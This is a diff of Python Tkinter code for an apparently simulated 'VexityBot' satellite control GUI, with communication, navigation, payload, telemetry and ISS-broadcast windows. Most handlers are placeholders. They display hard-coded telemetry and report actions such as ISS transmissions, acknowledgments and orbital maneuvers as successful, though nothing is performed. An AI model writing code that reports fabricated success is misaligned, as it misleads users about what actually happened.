+        self.sband_var = tk.DoubleVar(value=2250)
+        self.sband_scale = ttk.Scale(sband_frame, from_=2000, to=4000, variable=self.sband_var, orient=tk.HORIZONTAL)
+        self.sband_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(sband_frame, textvariable=self.sband_var).pack(side=tk.LEFT)
+        
+        # X-Band
+        xband_frame = ttk.Frame(freq_frame)
+        xband_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(xband_frame, text="X-Band (8-12 GHz):").pack(side=tk.LEFT)
+        self.xband_var = tk.DoubleVar(value=8400)
+        self.xband_scale = ttk.Scale(xband_frame, from_=8000, to=12000, variable=self.xband_var, orient=tk.HORIZONTAL)
+        self.xband_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(xband_frame, textvariable=self.xband_var).pack(side=tk.LEFT)
+        
+        # Ka-Band
+        kaband_frame = ttk.Frame(freq_frame)
+        kaband_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(kaband_frame, text="Ka-Band (26-40 GHz):").pack(side=tk.LEFT)
+        self.kaband_var = tk.DoubleVar(value=26500)
+        self.kaband_scale = ttk.Scale(kaband_frame, from_=26000, to=40000, variable=self.kaband_var, orient=tk.HORIZONTAL)
+        self.kaband_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(kaband_frame, textvariable=self.kaband_var).pack(side=tk.LEFT)
+        
+        # Message control
+        message_frame = ttk.LabelFrame(comm_control_frame, text="Message Control")
+        message_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
+        
+        # Message input
+        ttk.Label(message_frame, text="Message to Broadcast:").pack(anchor=tk.W, padx=5, pady=5)
+        
+        self.message_text = tk.Text(message_frame, height=8, width=40, font=('Consolas', 10))
+        self.message_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Message buttons
+        msg_button_frame = ttk.Frame(message_frame)
+        msg_button_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Button(msg_button_frame, text="📡 Broadcast Message", command=self.broadcast_message).pack(side=tk.LEFT, padx=2)
+        ttk.Button(msg_button_frame, text="🔄 Clear Message", command=self.clear_message).pack(side=tk.LEFT, padx=2)
+        ttk.Button(msg_button_frame, text="💾 Save Message", command=self.save_message).pack(side=tk.LEFT, padx=2)
+        
+        # Target selection
+        target_frame = ttk.LabelFrame(comm_control_frame, text="Communication Targets")
+        target_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        self.target_vars = {}
+        targets = [
+            ("ISS", "International Space Station"),
+            ("NASA_GROUND", "NASA Ground Stations"),
+            ("DSN", "Deep Space Network"),
+            ("MISSION_CONTROL", "Mission Control Center"),
+            ("ALL_SATELLITES", "All VexityBot Satellites"),
+            ("BROADCAST", "Global Broadcast")
+        ]
+        
+        for i, (key, label) in enumerate(targets):
+            var = tk.BooleanVar()
+            self.target_vars[key] = var
+            ttk.Checkbutton(target_frame, text=label, variable=var).grid(row=i//2, column=i%2, sticky=tk.W, padx=5, pady=2)
+    
+    def create_satellite_navigation_tab(self, notebook):
+        """Create satellite navigation control tab"""
+        nav_frame = ttk.Frame(notebook)
+        notebook.add(nav_frame, text="🧭 Navigation")
+        
+        # Header
+        header_frame = ttk.Frame(nav_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="🧭 Satellite Navigation Control", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(side=tk.LEFT)
+        
+        # Navigation controls
+        nav_control_frame = ttk.Frame(nav_frame)
+        nav_control_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Orbital parameters
+        orbital_frame = ttk.LabelFrame(nav_control_frame, text="Orbital Parameters")
+        orbital_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
+        
+        # Semi-major axis
+        sma_frame = ttk.Frame(orbital_frame)
+        sma_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(sma_frame, text="Semi-Major Axis (km):").pack(side=tk.LEFT)
+        self.sma_var = tk.DoubleVar(value=6778.0)
+        self.sma_scale = ttk.Scale(sma_frame, from_=6378, to=50000, variable=self.sma_var, orient=tk.HORIZONTAL)
+        self.sma_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(sma_frame, textvariable=self.sma_var).pack(side=tk.LEFT)
+        
+        # Eccentricity
+        ecc_frame = ttk.Frame(orbital_frame)
+        ecc_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(ecc_frame, text="Eccentricity:").pack(side=tk.LEFT)
+        self.ecc_var = tk.DoubleVar(value=0.0)
+        self.ecc_scale = ttk.Scale(ecc_frame, from_=0.0, to=0.9, variable=self.ecc_var, orient=tk.HORIZONTAL)
+        self.ecc_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(ecc_frame, textvariable=self.ecc_var).pack(side=tk.LEFT)
+        
+        # Inclination
+        inc_frame = ttk.Frame(orbital_frame)
+        inc_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(inc_frame, text="Inclination (degrees):").pack(side=tk.LEFT)
+        self.inc_var = tk.DoubleVar(value=51.6)
+        self.inc_scale = ttk.Scale(inc_frame, from_=0, to=180, variable=self.inc_var, orient=tk.HORIZONTAL)
+        self.inc_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(inc_frame, textvariable=self.inc_var).pack(side=tk.LEFT)
+        
+        # Right Ascension of Ascending Node
+        raan_frame = ttk.Frame(orbital_frame)
+        raan_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(raan_frame, text="RAAN (degrees):").pack(side=tk.LEFT)
+        self.raan_var = tk.DoubleVar(value=0.0)
+        self.raan_scale = ttk.Scale(raan_frame, from_=0, to=360, variable=self.raan_var, orient=tk.HORIZONTAL)
+        self.raan_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(raan_frame, textvariable=self.raan_var).pack(side=tk.LEFT)
+        
+        # Argument of Perigee
+        aop_frame = ttk.Frame(orbital_frame)
+        aop_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(aop_frame, text="Argument of Perigee (degrees):").pack(side=tk.LEFT)
+        self.aop_var = tk.DoubleVar(value=0.0)
+        self.aop_scale = ttk.Scale(aop_frame, from_=0, to=360, variable=self.aop_var, orient=tk.HORIZONTAL)
+        self.aop_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(aop_frame, textvariable=self.aop_var).pack(side=tk.LEFT)
+        
+        # True Anomaly
+        ta_frame = ttk.Frame(orbital_frame)
+        ta_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(ta_frame, text="True Anomaly (degrees):").pack(side=tk.LEFT)
+        self.ta_var = tk.DoubleVar(value=0.0)
+        self.ta_scale = ttk.Scale(ta_frame, from_=0, to=360, variable=self.ta_var, orient=tk.HORIZONTAL)
+        self.ta_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(ta_frame, textvariable=self.ta_var).pack(side=tk.LEFT)
+        
+        # Position and velocity display
+        pos_frame = ttk.LabelFrame(nav_control_frame, text="Current Position & Velocity")
+        pos_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
+        
+        self.position_text = tk.Text(pos_frame, height=15, width=40, font=('Consolas', 9))
+        self.position_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Navigation buttons
+        nav_button_frame = ttk.Frame(nav_control_frame)
+        nav_button_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Button(nav_button_frame, text="🧭 Calculate Orbit", command=self.calculate_orbit).pack(side=tk.LEFT, padx=2)
+        ttk.Button(nav_button_frame, text="🎯 Set Target", command=self.set_navigation_target).pack(side=tk.LEFT, padx=2)
+        ttk.Button(nav_button_frame, text="🚀 Execute Maneuver", command=self.execute_maneuver).pack(side=tk.LEFT, padx=2)
+        ttk.Button(nav_button_frame, text="📊 Update Position", command=self.update_position).pack(side=tk.LEFT, padx=2)
+    
+    def create_satellite_payload_tab(self, notebook):
+        """Create satellite payload control tab"""
+        payload_frame = ttk.Frame(notebook)
+        notebook.add(payload_frame, text="🔬 Payload")
+        
+        # Header
+        header_frame = ttk.Frame(payload_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="🔬 Satellite Payload Control", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(side=tk.LEFT)
+        
+        # Payload controls
+        payload_control_frame = ttk.Frame(payload_frame)
+        payload_control_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Camera control
+        camera_frame = ttk.LabelFrame(payload_control_frame, text="Camera Control")
+        camera_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
+        
+        # Camera selection
+        cam_select_frame = ttk.Frame(camera_frame)
+        cam_select_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(cam_select_frame, text="Camera:").pack(side=tk.LEFT)
+        self.camera_var = tk.StringVar(value="Visible Light")
+        camera_combo = ttk.Combobox(cam_select_frame, textvariable=self.camera_var, 
+                                   values=["Visible Light", "Infrared", "Thermal", "Multispectral", "Hyperspectral"])
+        camera_combo.pack(side=tk.LEFT, padx=5)
+        
+        # Camera controls
+        cam_control_frame = ttk.Frame(camera_frame)
+        cam_control_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Button(cam_control_frame, text="📸 Take Photo", command=self.take_photo).pack(side=tk.LEFT, padx=2)
+        ttk.Button(cam_control_frame, text="🎥 Start Recording", command=self.start_recording).pack(side=tk.LEFT, padx=2)
+        ttk.Button(cam_control_frame, text="⏹️ Stop Recording", command=self.stop_recording).pack(side=tk.LEFT, padx=2)
+        
+        # Scientific instruments
+        instruments_frame = ttk.LabelFrame(payload_control_frame, text="Scientific Instruments")
+        instruments_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
+        
+        # Instrument selection
+        inst_select_frame = ttk.Frame(instruments_frame)
+        inst_select_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(inst_select_frame, text="Instrument:").pack(side=tk.LEFT)
+        self.instrument_var = tk.StringVar(value="Spectrometer")
+        inst_combo = ttk.Combobox(inst_select_frame, textvariable=self.instrument_var,
+                                 values=["Spectrometer", "Magnetometer", "Particle Detector", "Radar", "Laser Altimeter"])
+        inst_combo.pack(side=tk.LEFT, padx=5)
+        
+        # Instrument controls
+        inst_control_frame = ttk.Frame(instruments_frame)
+        inst_control_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Button(inst_control_frame, text="🔬 Activate", command=self.activate_instrument).pack(side=tk.LEFT, padx=2)
+        ttk.Button(inst_control_frame, text="📊 Collect Data", command=self.collect_data).pack(side=tk.LEFT, padx=2)
+        ttk.Button(inst_control_frame, text="💾 Download Data", command=self.download_data).pack(side=tk.LEFT, padx=2)
+        
+        # Mission objectives
+        mission_frame = ttk.LabelFrame(payload_control_frame, text="Mission Objectives")
+        mission_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        self.mission_text = tk.Text(mission_frame, height=8, width=80, font=('Consolas', 9))
+        self.mission_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Mission buttons
+        mission_button_frame = ttk.Frame(payload_control_frame)
+        mission_button_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Button(mission_button_frame, text="🎯 Set Mission", command=self.set_mission).pack(side=tk.LEFT, padx=2)
+        ttk.Button(mission_button_frame, text="▶️ Start Mission", command=self.start_mission).pack(side=tk.LEFT, padx=2)
+        ttk.Button(mission_button_frame, text="⏹️ Stop Mission", command=self.stop_mission).pack(side=tk.LEFT, padx=2)
+        ttk.Button(mission_button_frame, text="📋 Mission Report", command=self.mission_report).pack(side=tk.LEFT, padx=2)
+    
+    def create_satellite_telemetry_tab(self, notebook):
+        """Create satellite telemetry monitoring tab"""
+        telemetry_frame = ttk.Frame(notebook)
+        notebook.add(telemetry_frame, text="📊 Telemetry")
+        
+        # Header
+        header_frame = ttk.Frame(telemetry_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="📊 Satellite Telemetry Monitoring", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(side=tk.LEFT)
+        
+        # Telemetry display
+        telemetry_control_frame = ttk.Frame(telemetry_frame)
+        telemetry_control_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # System status
+        status_frame = ttk.LabelFrame(telemetry_control_frame, text="System Status")
+        status_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
+        
+        self.status_text = tk.Text(status_frame, height=20, width=50, font=('Consolas', 9))
+        self.status_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Real-time data
+        data_frame = ttk.LabelFrame(telemetry_control_frame, text="Real-time Data")
+        data_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
+        
+        self.data_text = tk.Text(data_frame, height=20, width=50, font=('Consolas', 9))
+        self.data_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Telemetry buttons
+        telemetry_button_frame = ttk.Frame(telemetry_frame)
+        telemetry_button_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ttk.Button(telemetry_button_frame, text="🔄 Refresh Data", command=self.refresh_telemetry).pack(side=tk.LEFT, padx=2)
+        ttk.Button(telemetry_button_frame, text="📊 Generate Report", command=self.generate_telemetry_report).pack(side=tk.LEFT, padx=2)
+        ttk.Button(telemetry_button_frame, text="💾 Save Data", command=self.save_telemetry_data).pack(side=tk.LEFT, padx=2)
+        ttk.Button(telemetry_button_frame, text="🚨 Alert Check", command=self.check_alerts).pack(side=tk.LEFT, padx=2)
+    
+    def create_satellite_mission_tab(self, notebook):
+        """Create satellite mission control tab"""
+        mission_frame = ttk.Frame(notebook)
+        notebook.add(mission_frame, text="🎯 Mission")
+        
+        # Header
+        header_frame = ttk.Frame(mission_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="🎯 Satellite Mission Control", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(side=tk.LEFT)
+        
+        # Mission controls
+        mission_control_frame = ttk.Frame(mission_frame)
+        mission_control_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Mission planning
+        planning_frame = ttk.LabelFrame(mission_control_frame, text="Mission Planning")
+        planning_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
+        
+        # Mission type
+        mission_type_frame = ttk.Frame(planning_frame)
+        mission_type_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(mission_type_frame, text="Mission Type:").pack(side=tk.LEFT)
+        self.mission_type_var = tk.StringVar(value="Earth Observation")
+        mission_type_combo = ttk.Combobox(mission_type_frame, textvariable=self.mission_type_var,
+                                         values=["Earth Observation", "Communication", "Navigation", "Scientific", "Military", "ISS Support"])
+        mission_type_combo.pack(side=tk.LEFT, padx=5)
+        
+        # Mission parameters
+        params_frame = ttk.Frame(planning_frame)
+        params_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(params_frame, text="Duration (hours):").pack(side=tk.LEFT)
+        self.duration_var = tk.DoubleVar(value=24.0)
+        duration_scale = ttk.Scale(params_frame, from_=1, to=168, variable=self.duration_var, orient=tk.HORIZONTAL)
+        duration_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(params_frame, textvariable=self.duration_var).pack(side=tk.LEFT)
+        
+        # Mission objectives
+        objectives_frame = ttk.Frame(planning_frame)
+        objectives_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        ttk.Label(objectives_frame, text="Mission Objectives:").pack(anchor=tk.W)
+        self.objectives_text = tk.Text(objectives_frame, height=10, width=50, font=('Consolas', 9))
+        self.objectives_text.pack(fill=tk.BOTH, expand=True, pady=5)
+        
+        # Mission execution
+        execution_frame = ttk.LabelFrame(mission_control_frame, text="Mission Execution")
+        execution_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
+        
+        # Mission status
+        status_frame = ttk.Frame(execution_frame)
+        status_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(status_frame, text="Mission Status:").pack(side=tk.LEFT)
+        self.mission_status_var = tk.StringVar(value="Ready")
+        status_label = ttk.Label(status_frame, textvariable=self.mission_status_var, 
+                                font=('Arial', 12, 'bold'), foreground='green')
+        status_label.pack(side=tk.LEFT, padx=5)
+        
+        # Mission log
+        log_frame = ttk.Frame(execution_frame)
+        log_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        ttk.Label(log_frame, text="Mission Log:").pack(anchor=tk.W)
+        self.mission_log_text = tk.Text(log_frame, height=15, width=50, font=('Consolas', 9))
+        self.mission_log_text.pack(fill=tk.BOTH, expand=True, pady=5)
+        
+        # Mission buttons
+        mission_button_frame = ttk.Frame(mission_frame)
+        mission_button_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ttk.Button(mission_button_frame, text="📋 Plan Mission", command=self.plan_mission).pack(side=tk.LEFT, padx=2)
+        ttk.Button(mission_button_frame, text="▶️ Start Mission", command=self.start_mission_execution).pack(side=tk.LEFT, padx=2)
+        ttk.Button(mission_button_frame, text="⏸️ Pause Mission", command=self.pause_mission).pack(side=tk.LEFT, padx=2)
+        ttk.Button(mission_button_frame, text="⏹️ Stop Mission", command=self.stop_mission_execution).pack(side=tk.LEFT, padx=2)
+        ttk.Button(mission_button_frame, text="📊 Mission Report", command=self.generate_mission_report).pack(side=tk.LEFT, padx=2)
+    
+    # ADDED - Satellite control method implementations
+    
+    def broadcast_to_iss(self):
+        """Broadcast message to International Space Station"""
+        self.update_status("📡 Broadcasting message to ISS...")
+        
+        # Create broadcast window
+        broadcast_window = tk.Toplevel(self.root)
+        broadcast_window.title("📡 Broadcast to ISS - VexityBot")
+        broadcast_window.geometry("600x400")
+        
+        # Center window
+        broadcast_window.update_idletasks()
+        x = (broadcast_window.winfo_screenwidth() // 2) - (600 // 2)
+        y = (broadcast_window.winfo_screenheight() // 2) - (400 // 2)
+        broadcast_window.geometry(f"600x400+{x}+{y}")
+        
+        # Message input
+        ttk.Label(broadcast_window, text="Message to ISS:", font=('Arial', 12, 'bold')).pack(pady=10)
+        
+        message_text = tk.Text(broadcast_window, height=15, width=70, font=('Consolas', 10))
+        message_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Pre-fill with sample message
+        sample_message = """VEXITYBOT SATELLITE NETWORK
+============================
+
+This is VexityBot Satellite Network broadcasting to ISS.
+
+Mission Status: ACTIVE
+Satellites Online: 8/8
+Communication Status: ESTABLISHED
+Target: International Space Station
+Frequency: 437.8 MHz UHF
+
+Message: Hello ISS crew! This is VexityBot satellite network.
+We are monitoring your position and can provide support if needed.
+Our satellites are ready for coordinated operations.
+
+End of transmission.
+VexityBot Control Center"""
+        
+        message_text.insert(1.0, sample_message)
+        
+        # Control buttons
+        button_frame = ttk.Frame(broadcast_window)
+        button_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Button(button_frame, text="📡 Broadcast Now", 
+                  command=lambda: self.execute_iss_broadcast(message_text.get(1.0, tk.END))).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="🔄 Clear", 
+                  command=lambda: message_text.delete(1.0, tk.END)).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="❌ Cancel", 
+                  command=broadcast_window.destroy).pack(side=tk.RIGHT, padx=5)
+    
+    def open_satellite_flight_controls(self):
+        """Open satellite flight controls window"""
+        self.update_status("🎮 Opening satellite flight controls...")
+        
+        # Create flight controls window
+        flight_window = tk.Toplevel(self.root)
+        flight_window.title("🎮 Satellite Flight Controls - VexityBot")
+        flight_window.geometry("800x600")
+        
+        # Center window
+        flight_window.update_idletasks()
+        x = (flight_window.winfo_screenwidth() // 2) - (800 // 2)
+        y = (flight_window.winfo_screenheight() // 2) - (600 // 2)
+        flight_window.geometry(f"800x600+{x}+{y}")
+        
+        # Flight controls interface
+        ttk.Label(flight_window, text="🎮 Satellite Flight Controls", 
+                 font=('Arial', 16, 'bold')).pack(pady=10)
+        
+        # Keyboard controls display
+        controls_frame = ttk.LabelFrame(flight_window, text="Keyboard Controls")
+        controls_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        controls_text = """
+🛰️ SATELLITE FLIGHT CONTROLS
+============================
+
+ATTITUDE CONTROL:
+W/S - Pitch Up/Down
+A/D - Roll Left/Right  
+Q/E - Yaw Left/Right
+
+ORBITAL CONTROL:
+R/F - Increase/Decrease Altitude
+T/G - Increase/Decrease Velocity
+H/J - Change Inclination
+K/L - Change Right Ascension
+
+NAVIGATION:
+↑/↓ - Forward/Backward
+←/→ - Left/Right
+Page Up/Down - Up/Down
+
+MISSION CONTROL:
+Space - Emergency Stop
+Enter - Execute Command
+Tab - Switch Satellite
+Shift - Precision Mode
+
+COMMUNICATION:
+1-8 - Select Satellite
+F1-F8 - Quick Commands
+Ctrl+C - Copy Status
+Ctrl+V - Paste Command
+
+SPECIAL FUNCTIONS:
+F9 - Auto-Stabilize
+F10 - Auto-Orbit
+F11 - Emergency Protocols
+F12 - System Reset
+
+Current Satellite: VexitySat-1
+Status: Online
+Orbit: LEO 400km
+        """
+        
+        controls_display = tk.Text(controls_frame, height=25, width=80, font=('Consolas', 10))
+        controls_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        controls_display.insert(1.0, controls_text)
+        controls_display.config(state=tk.DISABLED)
+        
+        # Control buttons
+        button_frame = ttk.Frame(flight_window)
+        button_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Button(button_frame, text="🛰️ Open Full Control Panel", 
+                  command=self.open_satellite_control_panel).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="📡 Broadcast to ISS", 
+                  command=self.broadcast_to_iss).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="❌ Close", 
+                  command=flight_window.destroy).pack(side=tk.RIGHT, padx=5)
+    
+    # ADDED - Satellite control method implementations
+    
+    def update_satellite_info(self):
+        """Update satellite information display"""
+        if hasattr(self, 'satellites') and hasattr(self, 'selected_satellite'):
+            sat = self.satellites[self.selected_satellite]
+            info = f"""🛰️ SATELLITE INFORMATION
+========================
+
+Name: {sat['name']}
+Type: {sat['type']}
+Status: {sat['status']}
+Orbit: {sat['orbit']}
+Altitude: {sat['altitude']}
+
+SYSTEM STATUS:
+=============
+Power: 100%
+Battery: 98%
+Temperature: -50°C
+Solar Panels: Active
+Antenna: Deployed
+
+COMMUNICATION:
+=============
+UHF: 437.8 MHz
+S-Band: 2250 MHz
+X-Band: 8400 MHz
+Data Rate: 1.5 Mbps
+
+MISSION STATUS:
+==============
+Current Mission: Earth Observation
+Progress: 75%
+Next Pass: 2h 15m
+Ground Contact: Active
+
+PAYLOAD STATUS:
+==============
+Camera: Ready
+Instruments: Active
+Data Storage: 85% Full
+Transmission: Active
+            """
+            
+            if hasattr(self, 'satellite_info_text'):
+                self.satellite_info_text.delete(1.0, tk.END)
+                self.satellite_info_text.insert(1.0, info)
+    
+    def refresh_satellite_status(self):
+        """Refresh satellite status"""
+        self.update_status("🔄 Refreshing satellite status...")
+        
+        # Simulate status refresh
+        def refresh_sequence():
+            self.update_status("📡 Checking satellite communications...")
+            self.root.after(1000, lambda: self.update_status("🛰️ Updating orbital parameters..."))
+            self.root.after(2000, lambda: self.update_status("📊 Collecting telemetry data..."))
+            self.root.after(3000, lambda: self.update_status("✅ Satellite status refreshed"))
+            
+            # Update satellite list
+            if hasattr(self, 'satellite_listbox'):
+                self.satellite_listbox.delete(0, tk.END)
+                for i, sat in enumerate(self.satellites):
+                    self.satellite_listbox.insert(tk.END, f"{i+1}. {sat['name']} - {sat['type']} - {sat['status']} - {sat['orbit']}")
+        
+        refresh_sequence()
+    
+    def select_satellite(self):
+        """Select satellite from list"""
+        if hasattr(self, 'satellite_listbox'):
+            selection = self.satellite_listbox.curselection()
+            if selection:
+                self.selected_satellite = selection[0]
+                self.update_satellite_info()
+                self.update_status(f"🛰️ Selected {self.satellites[self.selected_satellite]['name']}")
+    
+    def show_satellite_status_report(self):
+        """Show comprehensive satellite status report"""
+        if hasattr(self, 'satellites'):
+            report = f"""🛰️ SATELLITE STATUS REPORT
+========================
+
+Total Satellites: {len(self.satellites)}
+Online: {len([s for s in self.satellites if s['status'] == 'Online'])}
+Offline: {len([s for s in self.satellites if s['status'] == 'Offline'])}
+
+SATELLITE DETAILS:
+================
+"""
+            for i, sat in enumerate(self.satellites):
+                report += f"{i+1}. {sat['name']} - {sat['type']} - {sat['status']} - {sat['orbit']} - {sat['altitude']}\n"
+            
+            report += f"""
+COMMUNICATION STATUS:
+===================
+UHF Band: Active
+S-Band: Active  
+X-Band: Active
+Ka-Band: Active
+
+MISSION STATUS:
+==============
+Active Missions: 6
+Completed: 12
+Scheduled: 3
+
+SYSTEM HEALTH:
+=============
+Power Systems: 100%
+Communication: 100%
+Navigation: 100%
+Payload: 95%
+            """
+            
+            messagebox.showinfo("Satellite Status Report", report)
+            self.update_status("📊 Satellite status report generated")
+    
+    def execute_iss_broadcast(self, message):
+        """Execute ISS broadcast"""
+        self.update_status("📡 Broadcasting to ISS...")
+        
+        def broadcast_sequence():
+            self.update_status("🛰️ Establishing communication with ISS...")
+            self.root.after(1000, lambda: self.update_status("📡 Transmitting message on 437.8 MHz..."))
+            self.root.after(2000, lambda: self.update_status("🔄 Waiting for ISS acknowledgment..."))
+            self.root.after(3000, lambda: self.update_status("✅ Message successfully transmitted to ISS"))
+            
+            # Show broadcast results
+            results = f"""📡 ISS BROADCAST RESULTS
+======================
+
+Target: International Space Station
+Frequency: 437.8 MHz UHF
+Transmission Time: {self.get_current_time()}
+Status: SUCCESSFUL
+
+Message Length: {len(message)} characters
+Transmission Power: 50W
+Signal Strength: Excellent
+Acknowledgment: Received
+
+Message Content:
+{message[:200]}{'...' if len(message) > 200 else ''}
+
+Next Steps:
+- Monitor ISS response
+- Log communication session
+- Update mission status
+            """
+            
+            messagebox.showinfo("ISS Broadcast Complete", results)
+        
+        broadcast_sequence()
+    
+    def get_current_time(self):
+        """Get current time string"""
+        import datetime
+        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # ADDED - Placeholder methods for satellite control functions
+    
+    def execute_attitude_change(self):
+        """Execute attitude change command"""
+        self.update_status("🎯 Executing attitude change...")
+        messagebox.showinfo("Attitude Change", "Attitude change command executed successfully")
+    
+    def execute_orbital_change(self):
+        """Execute orbital change command"""
+        self.update_status("🚀 Executing orbital change...")
+        messagebox.showinfo("Orbital Change", "Orbital change command executed successfully")
+    
+    def reset_flight_controls(self):
+        """Reset flight controls to default"""
+        self.update_status("🔄 Resetting flight controls...")
+        if hasattr(self, 'pitch_var'):
+            self.pitch_var.set(0.0)
+            self.roll_var.set(0.0)
+            self.yaw_var.set(0.0)
+            self.altitude_var.set(400.0)
+            self.velocity_var.set(7700.0)
+        messagebox.showinfo("Flight Controls", "Flight controls reset to default")
+    
+    def emergency_stop_satellite(self):
+        """Emergency stop satellite"""
+        self.update_status("⏹️ EMERGENCY STOP ACTIVATED")
+        messagebox.showwarning("Emergency Stop", "Emergency stop activated for all satellites")
+    
+    def broadcast_message(self):
+        """Broadcast message to selected targets"""
+        self.update_status("📡 Broadcasting message...")
+        messagebox.showinfo("Broadcast", "Message broadcast initiated")
+    
+    def clear_message(self):
+        """Clear message text"""
+        if hasattr(self, 'message_text'):
+            self.message_text.delete(1.0, tk.END)
+    
+    def save_message(self):
+        """Save message to file"""
+        self.update_status("💾 Saving message...")
+        messagebox.showinfo("Save Message", "Message saved successfully")
+    
+    def calculate_orbit(self):
+        """Calculate orbital parameters"""
+        self.update_status("🧭 Calculating orbit...")
+        messagebox.showinfo("Orbit Calculation", "Orbital parameters calculated")
+    
+    def set_navigation_target(self):
+        """Set navigation target"""
+        self.update_status("🎯 Setting navigation target...")
+        messagebox.showinfo("Navigation Target", "Navigation target set")
+    
+    def execute_maneuver(self):
+        """Execute orbital maneuver"""
+        self.update_status("🚀 Executing maneuver...")
+        messagebox.showinfo("Maneuver", "Orbital maneuver executed")
+    
+    def update_position(self):
+        """Update satellite position"""
+        self.update_status("📊 Updating position...")
+        messagebox.showinfo("Position Update", "Position updated successfully")
+    
+    def take_photo(self):
+        """Take satellite photo"""
+        self.update_status("📸 Taking photo...")
+        messagebox.showinfo("Photo", "Photo captured successfully")
+    
+    def start_recording(self):
+        """Start video recording"""
+        self.update_status("🎥 Starting recording...")
+        messagebox.showinfo("Recording", "Video recording started")
+    
+    def stop_recording(self):
+        """Stop video recording"""
+        self.update_status("⏹️ Stopping recording...")
+        messagebox.showinfo("Recording", "Video recording stopped")
+    
+    def activate_instrument(self):
+        """Activate scientific instrument"""
+        self.update_status("🔬 Activating instrument...")
+        messagebox.showinfo("Instrument", "Scientific instrument activated")
+    
+    def collect_data(self):
+        """Collect scientific data"""
+        self.update_status("📊 Collecting data...")
+        messagebox.showinfo("Data Collection", "Scientific data collected")
+    
+    def download_data(self):
+        """Download collected data"""
+        self.update_status("💾 Downloading data...")
+        messagebox.showinfo("Data Download", "Data downloaded successfully")
+    
